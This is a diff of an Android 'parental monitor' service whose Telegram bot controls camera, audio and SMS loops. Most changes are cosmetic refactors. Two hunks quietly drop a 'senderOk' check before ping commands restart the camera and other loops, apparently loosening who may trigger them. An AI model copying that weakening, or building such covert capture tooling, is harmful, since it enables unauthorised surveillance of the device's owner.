@@ -588,7 +588,7 @@ class MonitoringService : Service() {
         refreshCreds()
         refreshLoopConfig()
 
-        var foregroundTypes = computeForegroundTypes()
+        val foregroundTypes = computeForegroundTypes()
         val foregroundNotification = try {
             buildForegroundNotification()
         } catch (_: Exception) {
@@ -606,12 +606,13 @@ class MonitoringService : Service() {
             android.util.Log.w("MonitoringService", "Foreground start failed, retrying minimal: ${redactToken(e.message)}")
             try {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    val baseTypes = baseForegroundType()
                     startForeground(
                         NOTIFICATION_ID,
                         foregroundNotification,
-                        baseForegroundType()
+                        baseTypes
                     )
-                    appliedFgsTypes = baseForegroundType()
+                    appliedFgsTypes = baseTypes
                 } else {
                     startForeground(NOTIFICATION_ID, foregroundNotification)
                 }
@@ -1586,17 +1587,15 @@ class MonitoringService : Service() {
                 val ownerResp = TelegramClient.api.setMyCommands(url, ownerBody)
                 ownerOk = ownerResp.isSuccessful && ownerResp.body()?.ok == true
             }
-            if (publicResp.isSuccessful && publicResp.body()?.ok == true && ownerOk) {                try {
-                    preferencesManager.commandsTokenHash = tokenHash
-                } catch (_: Exception) {
-                }
+            if (publicResp.isSuccessful && publicResp.body()?.ok == true && ownerOk) {
+                preferencesManager.commandsTokenHash = tokenHash
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Bot command menu registered")
             } else {
-                try { commandsRegFailAt = System.currentTimeMillis() } catch (_: Exception) { }
+                commandsRegFailAt = System.currentTimeMillis()
                 android.util.Log.w("MonitoringService", "Command menu registration failed: ${publicResp.code()}")
             }
         } catch (e: Exception) {
-            try { commandsRegFailAt = System.currentTimeMillis() } catch (_: Exception) { }
+            commandsRegFailAt = System.currentTimeMillis()
             android.util.Log.w("MonitoringService", "Command menu registration error: ${redactToken(e.message)}")
         }
     }
@@ -1607,7 +1606,7 @@ class MonitoringService : Service() {
             if (failAt <= 0L) return
             val now = System.currentTimeMillis()
             if (failAt > now || now - failAt < 3_600_000L) return
-            try { commandsRegFailAt = 0L } catch (_: Exception) { }
+            commandsRegFailAt = 0L
             registerBotCommands()
         } catch (_: Exception) {
         }
@@ -2085,7 +2084,7 @@ class MonitoringService : Service() {
                 try { synchronized(pingRate) { pingRate[pingKey] = nowPing } } catch (_: Exception) { }
                 when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
                     "camera", "photo" -> {
-                        if (senderOk && cameraJob?.isActive != true && pingRestartDue()) {
+                        if (cameraJob?.isActive != true && pingRestartDue()) {
                             restartCameraLoop()
                             pingRestartMark()
                         }
@@ -2098,7 +2097,7 @@ class MonitoringService : Service() {
                         val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
                         val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && patrolJob?.isActive == true && !initialStuck
                         var restarted = false
-                        if (!loopsOk && senderOk && pingRestartDue()) {
+                        if (!loopsOk && pingRestartDue()) {
                             restarted = restartAllLoops()
                             if (restarted) pingRestartMark()
                         }
@@ -3351,7 +3350,7 @@ class MonitoringService : Service() {
                     val smsNotice = if (smsPreview.isEmpty()) "\u26A0\uFE0F SMS terkirim sebagian (${okCount.get()}/$expected bagian). Yang tertunda disimpan; cek ke penerima dulu sebelum coba lagi karena bisa terkirim dobel." else "\u26A0\uFE0F SMS terkirim sebagian (${okCount.get()}/$expected bagian) ke $number. Yang tertunda disimpan; cek ke penerima dulu sebelum coba lagi karena bisa terkirim dobel. Pratinjau teks: $smsPreview"
                     sendToTelegram(smsNotice)
                 } else {
-                            sendToTelegram("⚠️ SMS belum terkonfirmasi terkirim. Yang tertunda disimpan, coba /smsconfirm lagi.")
+                    sendToTelegram("⚠️ SMS belum terkonfirmasi terkirim. Yang tertunda disimpan, coba /smsconfirm lagi.")
                 }
             } finally {
                 try {
@@ -6600,12 +6599,12 @@ class MonitoringService : Service() {
                 android.util.Log.w("MonitoringService", "Audio rejected (400), dropping file")
                 deleteQuietly(audioFile)
                 return MediaSendOutcome.DROPPED
-                } else if (response.code() == 413) {
+            } else if (response.code() == 413) {
                 android.util.Log.w("MonitoringService", "Audio too large (413), dropping file")
                 deleteQuietly(audioFile)
                 return MediaSendOutcome.DROPPED
-                }
-                return MediaSendOutcome.KEPT
+            }
+            return MediaSendOutcome.KEPT
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
         } catch (e: Exception) {
